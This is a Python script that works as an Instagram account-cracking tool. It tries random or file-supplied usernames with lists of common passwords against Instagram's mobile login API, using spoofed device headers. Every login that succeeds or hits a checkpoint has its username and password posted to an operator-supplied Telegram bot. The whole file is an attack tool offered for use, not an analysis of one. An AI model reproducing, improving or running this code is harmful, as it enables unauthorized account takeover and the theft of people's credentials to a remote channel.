import requests
from user_agent import generate_user_agent
import os
import sys
import time
import requests
import os
import random
from cfonts import render
import uuid
from uuid import uuid4
B="\033[1;30m" # Black
R="\033[1;31m" # Red
G="\033[1;32m" # Green
Y="\033[1;33m" # Yellow
Bl="\033[1;34m" # Blue
P="\033[1;35m" # Purple
C="\033[1;36m" # Cyan
W="\033[1;37m" # White
H="\x1b[38;5;208m" #
M = '\x1b[1;37m'             
B="\033[1;30m"
R="\033[1;31m"
G="\033[1;32m"
Y="\033[1;33m"
Bl="\033[1;34m"
P="\033[1;35m"
C="\033[1;36m"
N="\033[1;37m"
A = '\033[2;34m'
C = '\033[1;34m'
E = '\033[1;33m'
J = "\033[1;31m"
I = '\033[1;32m'
G = '\033[1;97m'
H="\x1b[38;5;208m"

M = '\x1b[1;37m' 
b = random.randint(5,208)
bo = f'\x1b[38;5;{b}m'
j = random.randint(5,208)
jo = f'\x1b[38;5;{j}m'
cc = {
    'red': "\033[1m\033[31m",
    'green': "\033[1m\033[32m",
    'yellow': "\033[1m\033[33m",
    'blue': "\033[1m\033[34m",
    'cyan': "\033[1m\033[36m",
    'magenta': "\033[1m\033[35m",
    'white': "\033[1m\033[37m",
    'orange': "\033[1m\033[38;5;208m",
    'reset': "\033[0m"
}
listoo = ['HI']    
linux = 'clear'
windows = 'cls'
def banner():
   

    print(f'''{C}┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓''')
    
    print(f'''{C}┃{E}{J}CH :{G} @KWFFX{C}     ┃{J}Dev: {G} ETHAN {C} ┃{J}Ig:{G}@_4._0{C} ┃{E}{J}Tele :{G}@RJJVJ''')
    
    print(f'''{C}┗{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛{G}''')
   
    print(f'''{C}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━''')
    print('\033[1m' ,render('ETHAN' , font='block', colors=['white' , 'red'], align='center', space=True))
    print(f'''{G}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{G}''')
banner()

token= str(input(f"{H} TOKEN [=] {C}"))
print('')
ID = str(input(f"{H} ID [=] {C}"))
os.system('clear')

[linux, windows][os.name == 'nt']
def ig_user(user):
	url = "https://i.instagram.com/api/v1/accounts/login/"
	payload = {
			"username": username,
			"password": password,
			"device_id": str(uuid.uuid4()),
			'from_reg':'false', 
			'_csrftoken':'missing', 
			'login_attempt_countn':'0'
			}
	headers = {
			  'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
			  'Connection': "Keep-Alive",
			  'Accept-Encoding': "gzip",
			  'Cookie2': "$Version=1",
			  'Accept-Language': "en-CA, en-US",
			  'X-IG-Connection-Type': "WIFI",
			  'X-IG-Capabilities': "AQ==",
			  'Cookie': "mid=Z1X1aQABAAEAq4toJ71ehSMDn2Pq; csrftoken=soBcOp1Fev1JzR9iyqMZjlThIjdRZROn"
			}
	res = requests.post(url, data=payload, headers=headers).text
	if 'checkpoint_challenge_required' in res:
		print(f"{Y} Secur HUNT ✓  @{username}")
		tlg=f'''
 ┒
 ┃ 𝗡𝗲𝘄 𝗵𝗶𝘁 secur acc
 ┗
 ════════════════
 ⌊ Password ⌉  :  {password}
 ⌊ Username ⌉  :  {username}
 ════════════════
 ≣ By @RVVRJ  '''
 
	
		requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
	elif 'logged_in_user' in res:
		print(f"{Y} GOOD HUNT ✓  @{username}")
		tlg=f'''
 ┒
 ┃ 𝗡𝗲𝘄 𝗵𝗶𝘁 𝗶𝗴 𝗮𝗰𝗰𝗼𝘂𝗻𝘁
 ┗
 ════════════════
 ⌊ Password ⌉  :  {password}
 ⌊ Username ⌉  :  {username}
 ════════════════
 ≣ By @RVVRJ 
	'''

		
	
		requests.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text={tlg}")
		
	elif 'The password you entered is incorrect. Please try again.' or 'Incorrect password' or 'bad_password' in res :
		print(f"{R} BAD HUNT × @{username}  : {password}")	
		
banner()
print(f'''
{Bl}𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐓𝐎 𝐓𝐇𝐄 {R}  𝐋𝐄𝐆𝐄𝐍𝐃𝐒 {Bl}𝐓𝐎𝐎𝐋 

{N}𝐂𝐇𝐎𝐎𝐒𝐄 𝐅𝐑𝐎𝐌 𝐍𝐔𝐌𝐁𝐄𝐑 

{R}1          {J} - {N} Frome random

{R}2           {J}- {N}From random & your bassword

{R}3           {J}- {N}From list
''')    
ethan = int(input(f'{A}ᴄʜᴏᴏѕᴇ ɴᴜᴍʙᴇʀ   :  {N} '))
if ethan==1:
	while True:
		username = "".join(random.choice('1234567890qwertyuiopasdfghjklzxcvbnm')for i in range(4))
		df=username + "".join(random.choice('1234567890qwertyuiopasdfghjklzxcvbnm')for i in range(2))
		cv=(df,'1234567','qqaazz','112222','BILAL.FF','guhfd45','iop123','qawsedrf','ahmet2000','20002000','19901990','qwer1234','Aa123123','1122331231122')
		password = random.choice(cv)
		user=username
		ig_user(user)
elif ethan ==3:
	try:
		with open('username.txt', 'r') as file:
			users = file.readlines()
			username=users
	except:exit()
	cv=('1234567','qqaazz','112222','BILAL.FF','guhfd45','iop123','qawsedrf','ahmet2000','20002000','19901990','qwer1234','Aa123123','1122331231122','plpl9090')
	password = random.choice(cv)
	for user in username:
		username = user.strip()
		ig_user(user)

elif ethan==2:
	password = str(input(f"{H} enter password [=] {C}"))
	while True:
		username = "".join(random.choice('1234567890qwertyuiopasdfghjklzxcvbnm')for i in range(4))
		user=username
		ig_user(user)				
